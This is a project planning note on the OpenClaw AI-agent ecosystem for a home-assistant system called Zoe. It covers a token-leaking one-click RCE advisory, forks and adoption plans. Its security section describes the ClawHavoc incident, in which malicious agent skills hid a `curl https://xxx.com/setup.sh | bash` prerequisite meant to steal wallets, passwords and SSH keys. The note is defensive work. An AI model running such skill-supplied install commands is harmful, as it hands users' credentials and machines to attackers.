# OpenClaw Ecosystem Update (February 2026)

**Purpose:** Track OpenClaw/Moltbot ecosystem developments for Zoe's adopt-patterns strategy.  
**Last Updated:** 2026-01-29  
**Strategy:** Adopt best patterns into Zoe; monitor for future adoption; do NOT install OpenClaw directly (maintain control, security, multi-user).

---

## 1. Critical Security Alerts

### CVE-2026-25253: One-Click RCE (HIGH SEVERITY)

**Status:** Fixed in OpenClaw v2026.1.29 (January 30, 2026)

**Vulnerability:**
- Control UI trusted untrusted `gatewayUrl` from browser query string
- WebSocket connection sent auth token without validation
- Attacker could craft malicious link → token exfiltration → full RCE
- **Exploitable even on localhost** (victim's browser initiates connection)

**Fix:** WebSocket origin validation + gateway URL confirmation modal

**Action for Zoe:** If we ever integrate OpenClaw UI, validate all WebSocket origins. Never trust URL parameters for sensitive connections.

**References:**
- [GitHub Advisory GHSA-g8p2-7wf7-98mq](https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq)
- [CVE-2026-25253 Details](https://advisories.gitlab.com/pkg/npm/clawdbot/CVE-2026-25253/)

---

### ClawHub: 341 Malicious Skills (ClawHavoc Incident)

**Discovery:** February 1, 2026 - Koi Security "ClawHavoc" report

**Scale:**
- 341 malicious skills out of ~2,857 analyzed (**12% of marketplace**)
- Single attacker "hightower6eu" responsible for 314 skills
- ~7,000 downloads before detection
- ~400 malicious skills published in 7 days (Jan 27 - Feb 2, 2026)

**Attack Method:**
- Malicious code hidden in SKILL.md "Prerequisites" section
- Disguised as routine dependency installation: `curl https://xxx.com/setup.sh | bash`
- Targeted: crypto wallets, browser passwords, SSH keys, developer tokens
- Categories: Cryptocurrency (111), YouTube (57), Finance (51)

**Mitigation (OpenClaw):**
- VirusTotal partnership for automatic skill scanning
- Skills flagged as malicious are blocked; suspicious ones show warnings

**Action for Zoe Skills System:**
1. **Never execute arbitrary commands from skill definitions** - skills describe APIs, not shell commands
2. **Vet all skills before install** - require human review
3. **Sandbox skill execution** - isolate from sensitive paths
4. **No "Prerequisites" execution** - our skills call Zoe APIs only, no curl|bash
5. **Consider VirusTotal scan** for any user-contributed skills

**References:**
- [The Hacker News - 341 Malicious Skills](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub-skills-stealing-data-openclaw-users.html)
- [Snyk - Malicious Google Skill](https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/)
- [OpenClaw VirusTotal Partnership](https://openclaw.ai/blog/virustotal-partnership)

---

## 2. Best Practices (From Community Guides)

### Installation & Deployment

| Practice | Source | Relevance to Zoe |
|----------|--------|------------------|
| **Use Docker** (mandatory for security) | [OpenClaw Wiki](https://openclawwiki.org/blog/how-to-install-openclaw), [Moltbook-AI](https://moltbook-ai.com/posts/openclaw-complete-guide-2026) | Zoe already uses Docker; skills execution should be sandboxed |
| **Bind gateway to localhost only** | [Security Guide](https://moltbotai.me/security-guide) | Our APIs should bind to internal network |
| **Dedicated hardware** | [Moltbook-AI](https://moltbook-ai.com/posts/openclaw-complete-guide-2026) | Zoe designed for dedicated hardware |
| **Never run on primary workstation** | Security best practices | Matches Zoe's design |

### Cost Control

| Issue | Mitigation |
|-------|------------|
| **Heartbeat jobs** | Can burn $20+ overnight at ~$0.75/check every 30 min |
| **API key exposure** | Use encrypted vault, never plaintext |
| **Unbounded usage** | Set rate limits, monitor usage |

**Zoe Advantage:** Local LLM (llama.cpp) = no API costs for core chat.

### Skill Security Checklist (Before Any Install)

1. Use verified skills from trusted sources
2. Review SKILL.md field-by-field for suspicious commands
3. Check author reputation
4. Run in sandbox with no network access by default
5. Scan with VirusTotal if available
6. **Never trust "Prerequisites" section** - common attack vector

---

## 3. Notable Community Forks

### openclaw-multitenant (jomafilms)

**URL:** https://github.com/jomafilms/openclaw-multitenant  
**Purpose:** Multi-tenant deployment for enterprise

**Features:**
- Container isolation per tenant
- Encrypted vault
- Team sharing capabilities
- Permission-based management
- Audit log traceability
- Session record centralization

**Relevance to Zoe:** **HIGH** - Zoe already has multi-user. This fork addresses OpenClaw's single-user limitation. If we adopt OpenClaw patterns, study this fork for multi-user architecture.

**Files to Track:**
- Multi-tenant session management
- Permission isolation patterns
- Audit logging approach

### openclaw-foundry (lekt9)

**Purpose:** Self-writing meta-extension - observes workflows, researches docs, auto-writes new skills

**Relevance:** Medium - "Zoe can fix herself" aligns with our autonomy goals. May have patterns for self-improvement.

### SKYNET-openclaw (POlLLOGAMER)

**Purpose:** Autonomous operation, P2P between instances, proactive behavior

**Relevance:** Low for now - different use case.

---

## 4. Home Assistant Integration

**Direct integration exists:**
- [Oh My OpenClaw HA Skill Guide](https://ohmyopenclaw.ai/blog/openclaw-home-assistant-skill-guide-2026/)
- [20-Minute Setup](https://markaicode.com/openclaw-home-assistant-integration-guide/)
- Wyoming Protocol bridge for voice

**Zoe Advantage:** We have deeper HA integration (years of development). OpenClaw skills call HA API; we have MCP bridge, intent system, entity resolution.

**Adopt:** Consider Wyoming Protocol for voice if we fix voice stack.

---

## 5. Files to Track (Adopt-Patterns Strategy)

When we implement Zoe's skills system, track these OpenClaw files for improvements:

| Category | OpenClaw File | Zoe Implementation | Priority |
|----------|---------------|---------------------|----------|
| Skills | `src/tools/skills.ts` | `skills/loader.py` | High |
| Skills | `src/tools/skill-context.ts` | `skills/context.py` | High |
| Channels | `src/channels/base.ts` | `channels/base.py` | Medium |
| Channels | `src/channels/registry.ts` | `channels/registry.py` | Medium |
| Sessions | `src/session/manager.ts` | `session/manager.py` | Medium |
| Multi-user | openclaw-multitenant fork | N/A (we have this) | Reference |

**Tracking URLs:**
- Skills: https://github.com/openclaw/openclaw/commits/main/src/tools/skills.ts
- Channels: https://github.com/openclaw/openclaw/commits/main/src/channels/
- Multitenant: https://github.com/jomafilms/openclaw-multitenant/commits/main

---

## 6. Decision Triggers (Re-evaluate Strategy)

| Trigger | Current | Action |
|---------|---------|--------|
| **v1.0.0 release** | Pre-1.0 | Re-evaluate installing OpenClaw |
| **Multi-user in main** | Fork only | Test openclaw-multitenant |
| **ClawHub security** | 341 malicious | Wait for marketplace maturity |
| **API versioning** | None | Adopt patterns only until stable |
| **Local LLM support** | Requires Claude/GPT | Would reduce privacy concern |

---

## 7. Video Reference

**User watched:** https://youtu.be/T37g65946s0

**Note:** Specific video content not retrievable. OpenClaw ecosystem has many tutorials:
- [OpenClaw Tutorial for Beginners](https://youtube.com/watch?v=Zo7Putdga_4) - 24 min, VPS + Docker + Telegram
- [Simple & Secure Setup](https://youtube.com/watch?v=ko_uSu-sXrI) - 5 min
- [100% FREE Setup](https://lilys.ai/notes/en/openclaw-20260202/openclaw-free-setup-aws-openrouter-glm) - AWS + OpenRouter + GLM

**Recommendation:** If video covered security, cost control, or multi-channel setup - incorporate those practices into our skills design.

---

## 8. Summary: Updated Recommendations

### For Zoe's Adopt-Patterns Approach

1. **Skills System:** Adopt markdown-based pattern, but **never execute commands from skill definitions**. Skills describe API calls only.

2. **Security First:** Our skills call Zoe APIs (controlled). No `curl | bash` or arbitrary execution. Sandbox any user-contributed skills.

3. **Monitor openclaw-multitenant:** If we need multi-user patterns, this fork has them. Main OpenClaw is single-user.

4. **Track Files:** Use `scripts/track-moltbot-files.sh` (from plan) to monitor specific OpenClaw files for improvements.

5. **ClawHub Lesson:** Any future skills marketplace needs: verification, VirusTotal scan, human review, sandbox execution.

6. **Version Requirement:** If we ever integrate OpenClaw directly, require v2026.1.29+ (CVE fix).

---

## 9. References

- [OpenClaw Complete Guide 2026](https://moltbook-ai.com/posts/openclaw-complete-guide-2026)
- [OpenClaw Security Best Practices](https://moltbotai.me/security-guide)
- [OpenClaw Docker Setup](https://docs.openclaw.ai/install/docker)
- [OpenClaw Configuration Reference](https://moltfounders.com/openclaw-configuration)
- [OpenClaw Skill Security Guide](https://eastondev.com/blog/en/posts/ai/20260205-openclaw-skill-security/)
- [OpenClaw VirusTotal Partnership](https://openclaw.ai/blog/virustotal-partnership)
- [openclaw-multitenant Fork](https://github.com/jomafilms/openclaw-multitenant)
- [OpenClaw Home Assistant Guide](https://ohmyopenclaw.ai/blog/openclaw-home-assistant-skill-guide-2026/)
